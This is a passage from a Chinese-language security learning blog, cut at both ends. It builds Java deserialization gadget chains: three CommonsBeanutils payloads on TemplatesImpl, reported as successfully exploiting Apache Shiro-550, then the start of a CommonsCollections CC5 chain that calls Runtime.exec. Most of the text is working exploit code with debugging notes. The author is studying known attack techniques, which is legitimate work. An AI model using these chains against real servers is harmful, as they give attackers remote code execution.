class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>Class&lt;TemplatesImpl&gt; c1 = TemplatesImpl.class;<br><span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>nameFiled.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br><span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br><br><span class="hljs-comment">//现在构造payload，没有反序列化，先反射给_tfactory赋值</span><br>Class&lt;TemplatesImpl&gt; c = TemplatesImpl.class;<br><span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br><span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Security/java/tmp/classes/Test_.class&quot;</span>));<br><span class="hljs-type">byte</span>[][]codes=&#123;code&#125;;<br>bytecodes.set(templates,codes);<br>System.out.println(PropertyUtils.getProperty(templates,<span class="hljs-string">&quot;outputProperties&quot;</span>));<br></code></pre></td></tr></table></figure><p>那现在就分析向上寻找谁调用PropertyUtils.getProperty，一直找到反序列化的入口类</p><p>找到有点眼熟的compare方法里面有调这个方法，那就想他有可能和CC2连上</p><p><img src="/2025/05/23/Shiro-550/image-20250521211906726-174798650480538.png"></p><p>具体看一下property可控，o1目前由调compare的方法决定</p><p>那想的是这儿的compare相当于CC2中TransforingComparator.compare(),所以从这里开始连上CC2前面队列就好了</p><p><strong>这里尝试的构造先手动给_factory赋值了，先看add那里能否成功触发</strong></p><p>啊哦！这里发现按之前学的思路写add的时候并没有走到利用链上，没有弹出计算器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>Class&lt;TemplatesImpl&gt; c1 = TemplatesImpl.class;<br><span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>nameFiled.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br><span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br><br><span class="hljs-comment">//现在构造payload，没有反序列化，先反射给_tfactory赋值</span><br>Class&lt;TemplatesImpl&gt; c = TemplatesImpl.class;<br><span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br><span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Security/java/tmp/classes/Test_.class&quot;</span>));<br><span class="hljs-type">byte</span>[][]codes=&#123;code&#125;;<br>bytecodes.set(templates,codes);<br><span class="hljs-comment">//System.out.println(PropertyUtils.getProperty(templates,&quot;outputProperties&quot;));</span><br>BeanComparator&lt;Object&gt; beanComparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>&lt;&gt;(<span class="hljs-string">&quot;outputProperties&quot;</span>);<br>PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(beanComparator);<br>queue.add(templates);<br>queue.add(<span class="hljs-number">1</span>);<br>       <br><br></code></pre></td></tr></table></figure><p>报错：</p><p><img src="/2025/05/23/Shiro-550/image-20250522153530746-174798650721339.png"></p><p><strong>调试</strong>走到这儿，发现是因为add后续走到的BeanComparator里面，o1为Integer，没有参数为Integer的getProperty方法</p><p><img src="/2025/05/23/Shiro-550/image-20250522164154706-174798650921740.png"></p><p>所以add能触发CB的PropertyUtils.getProperty的话是不能传数字的</p><h4 id="关联之前学过的"><a href="#关联之前学过的" class="headerlink" title="关联之前学过的"></a><strong>关联之前学过的</strong></h4><p>回顾之前的CC2CC4我们就是这么写的呀，  add两次就改变了size的值，同时add直接传参也达到控制了transformer(arg)的参数的效果，不用数组了</p><p>它们第二次add(1)没有报错是因为它们<strong>为了断开后面先调的是TransformingCompare.constantTransformer.transfomer()，</strong>这个方法就对参数没要求所以不会报错的</p><p>add之后才反射修改TransformingCompare的comparator为instantiateTransformer或invokerTransformer</p><h4 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h4><p>那也按照这个思路，继续编写CB的payload，把后面断开这样add的时候不会触发CB也就能add数字了(组长的链子也是这么写的)</p><ul><li><p>它的依赖要注意一下在本地是有CC4的：<br>因为它在本地借用了TransformingComprae断开后面防止add提前消耗利用链，反序列化的时候已经改回来了去打shiro倒是也不影响的</p></li><li><p>add两次断开后面</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>Class&lt;TemplatesImpl&gt; c1 = TemplatesImpl.class;<br><span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>nameFiled.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br><span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Security/java/tmp/classes/Test_.class&quot;</span>));<br><span class="hljs-type">byte</span>[][]codes=&#123;code&#125;;<br>bytecodes.set(templates,codes);<br>      <br>TransformingComparator&lt;Object, Integer&gt; transformingComparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<br><br>BeanComparator&lt;Object&gt; beanComparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>&lt;&gt;(<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br><span class="hljs-comment">//断开，先调 TransformingComparator的compare</span><br>PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>queue.add(templates);<br>queue.add(<span class="hljs-number">1</span>);<br><br><span class="hljs-comment">//add之后再修改回来</span><br>Class&lt;PriorityQueue&gt; c4 = PriorityQueue.class;<br><span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> c4.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>comparator.setAccessible(<span class="hljs-literal">true</span>);<br>comparator.set(queue,beanComparator);<br><br><br>serialize(queue);<br>unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure><p>报错：</p><p><img src="/2025/05/23/Shiro-550/image-20250523142755272-174798651350141.png"></p><p>BeanComparator构造器中ComparableComparator是CC中的，而shiro默认是没有CC依赖的</p><p><img src="/2025/05/23/Shiro-550/image-20250523104245648-174798651555042.png"></p><p>发现还有一个构造器，用这个就可以不用CC依赖了，所以需要找一个继承了Comparator和Serialize的传进构造器中</p><p><img src="/2025/05/23/Shiro-550/image-20250523104430680-174798651734343.png"></p><p>所以最后修改如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>     Class&lt;TemplatesImpl&gt; c1 = TemplatesImpl.class;<br>     <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>     nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>     nameFiled.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>     <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>     bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>     <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Security/java/tmp/classes/Test_.class&quot;</span>));<br>     <span class="hljs-type">byte</span>[][]codes=&#123;code&#125;;<br>     bytecodes.set(templates,codes);<br>   <br>     TransformingComparator&lt;Object, Integer&gt; transformingComparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<br><br>       <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br><br>     <span class="hljs-comment">//断开，先调 TransformingComparator的compare</span><br>     PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>     queue.add(templates);<br>     queue.add(<span class="hljs-number">1</span>);<br><br>     <span class="hljs-comment">//add之后再修改回来</span><br>     Class&lt;PriorityQueue&gt; c4 = PriorityQueue.class;<br>     <span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> c4.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>     comparator.setAccessible(<span class="hljs-literal">true</span>);<br>     comparator.set(queue,beanComparator);<br><br><br>     serialize(queue);<br>     unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure><p>shiro成功打通！</p><p><img src="/2025/05/23/Shiro-550/image-20250523152049272-174798652012444.png"></p><h4 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h4><p><strong>除了这么写，CC4当时还尝试了直接反射修改size，同样的在这儿也写一下</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><br>     <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>     Class&lt;TemplatesImpl&gt; c1 = TemplatesImpl.class;<br>     <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>     nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>     nameFiled.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>     <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>     bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br><br>     <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Security/java/tmp/classes/Test_.class&quot;</span>));<br>   <br><span class="hljs-type">byte</span>[][]codes=&#123;code&#125;;<br>     bytecodes.set(templates,codes);<br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br>     <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(beanComparator);<br>     queue.add(templates);<br>     Class&lt;PriorityQueue&gt; c4 = PriorityQueue.class;<br>     <span class="hljs-type">Field</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> c4.getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>     size.setAccessible(<span class="hljs-literal">true</span>);<br>     size.set(queue,<span class="hljs-number">2</span>);<br>     serialize(queue);<br>     unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br></code></pre></td></tr></table></figure><ul><li><p>这里add并不会触发利用链(size是在add之后才反射修改的，所以i&#x3D;size&#x3D;0,不会调siftUp及后续利用链的)</p><p><img src="/2025/05/23/Shiro-550/image-20250522230931579-174798652314545.png"></p></li></ul><p>这么写还挺简单，不用考虑断开怎么构造了嘿嘿</p><p>报错：</p><p><img src="/2025/05/23/Shiro-550/image-20250523103126149-174798652480046-174798695899955.png"></p><p>这是因为</p><p>ysoserial中的CB版本是1.9.2，shiro自带的是1.8.3</p><p><img src="/2025/05/23/Shiro-550/image-20250523103517344.png"></p><p>换成在CB1.8.3的环境就好了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">&lt;dependencies&gt;<br>    &lt;dependency&gt;<br>        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;<br>        &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;<br>        &lt;version&gt;4.0&lt;/version&gt;<br>    &lt;/dependency&gt;<br>    &lt;dependency&gt;<br>        &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;<br>        &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;<br>        &lt;version&gt;1.8.3&lt;/version&gt;<br>    &lt;/dependency&gt;<br>&lt;/dependencies&gt;<br></code></pre></td></tr></table></figure><p>shiro打通+1</p><p><img src="/2025/05/23/Shiro-550/image-20250523152614267-174798652761347-174798693599354.png"></p><h4 id="payload3"><a href="#payload3" class="headerlink" title="payload3"></a>payload3</h4><p>组长的视频中还提到一种断开的点   new PriorityQueue的时候啥都不传，这样就和CB断开了，就可以add两次传数字，再反射修改queue属性了</p><p>payload如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>     Class&lt;TemplatesImpl&gt; c1 = TemplatesImpl.class;<br>     <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>     nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>     nameFiled.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>     <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>     bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>     Class&lt;TemplatesImpl&gt; c = TemplatesImpl.class;<br>     <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>     tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>     tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>     <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Security/java/tmp/classes/Test_.class&quot;</span>));<br>     <span class="hljs-type">byte</span>[][]codes=&#123;code&#125;;<br>     bytecodes.set(templates,codes);<br>     <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br>     PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;();<br>     queue.add(<span class="hljs-number">2</span>);<br>     queue.add(<span class="hljs-number">1</span>);<br>     <span class="hljs-comment">//add之后再修改回来</span><br>     Class&lt;PriorityQueue&gt; c4 = PriorityQueue.class;<br>     <span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> c4.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>     comparator.setAccessible(<span class="hljs-literal">true</span>);<br>     comparator.set(queue,beanComparator);<br>     Object[] objects = &#123;templates, templates&#125;;<br>     <span class="hljs-type">Field</span> <span class="hljs-variable">queueField</span> <span class="hljs-operator">=</span> c4.getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>     queueField.setAccessible(<span class="hljs-literal">true</span>);<br>     queueField.set(queue,objects);<span class="hljs-comment">//这里注意queue是数组</span><br>     serialize(queue);<br>     unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br></code></pre></td></tr></table></figure><p>shiro打通+1</p><p><img src="/2025/05/23/Shiro-550/image-20250523152849195-174798653032548.png"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CC5 &amp;&amp; CC7</title>
    <link href="/2025/05/13/CC5_CC7/"/>
    <url>/2025/05/13/CC5_CC7/</url>
    
    <content type="html"><![CDATA[<p>CC5 &amp;&amp;CC7</p><span id="more"></span><p><img src="/2025/05/13/CC5_CC7/image-20250513163437107-174712530902120.png" alt="image-20250513163437107"></p><h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><h2 id="一-分析"><a href="#一-分析" class="headerlink" title="一.分析"></a>一.分析</h2><p>它与之前的区别：调LazyMap.get不同</p><p>之前学过CC1AnnotationInvocationHandler.invoke.get</p><p>CC6TiedMapEntry.hashCode.getValue.get</p><p><strong>现在用toString:</strong></p><ul><li><p>TiedMapEntry.toString.getValue.get</p><p>BadAttributeValueExpException它作为入口类</p></li></ul><h2 id="二-不同部分的exp"><a href="#二-不同部分的exp" class="headerlink" title="二.不同部分的exp"></a>二.不同部分的exp</h2><h3 id="后部分与之前相同"><a href="#后部分与之前相同" class="headerlink" title="&lt;2.1&gt;后部分与之前相同"></a>&lt;2.1&gt;后部分与之前相同</h3><p>首先，后半段还是像CC1那样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers=&#123;<br>          <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>          <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>          <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>          <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>  &#125;;<br>  <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>  <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>  <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br> <span class="hljs-comment">// lazymap.get(1);</span><br></code></pre></td></tr></table></figure><h3 id="TiedMapEntry-toString-get"><a href="#TiedMapEntry-toString-get" class="headerlink" title="&lt;2.2&gt;TiedMapEntry.toString.get"></a>&lt;2.2&gt;TiedMapEntry.toString.get</h3><p>然后连接TiedMapEntry.toString.getValue.get—-&gt;LazyMap.get</p><p>TiedMapEntry构造器为pubic，直接传lazymap</p><p><img src="/2025/05/13/CC5_CC7/image-20250506220723113-174705186722614.png" alt="image-20250506220723113"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">   Transformer[] transformers=&#123;<br>           <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>           <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>           <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>           <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>   &#125;;<br>   <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>   <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>   <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br>  <span class="hljs-comment">// lazymap.get(1);</span><br>   <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap,<span class="hljs-string">&quot;key&quot;</span>);<br><span class="hljs-comment">//   tiedMapEntry.toString();</span><br></code></pre></td></tr></table></figure><h3 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="&lt;2.3&gt;BadAttributeValueExpException"></a>&lt;2.3&gt;BadAttributeValueExpException</h3><p>最后就是连接BadAttributeValueExpException.readObject.toString—-&gt;TiedMapEntry</p><p><img src="/2025/05/13/CC5_CC7/image-20250506221407897-174705186187613.png" alt="image-20250506221407897"></p><p><img src="/2025/05/13/CC5_CC7/image-20250506222652599-174705185977312.png" alt="image-20250506222652599"></p><p>反射修改val值</p><h2 id="三-最终完整exp"><a href="#三-最终完整exp" class="headerlink" title="三.最终完整exp"></a>三.最终完整exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 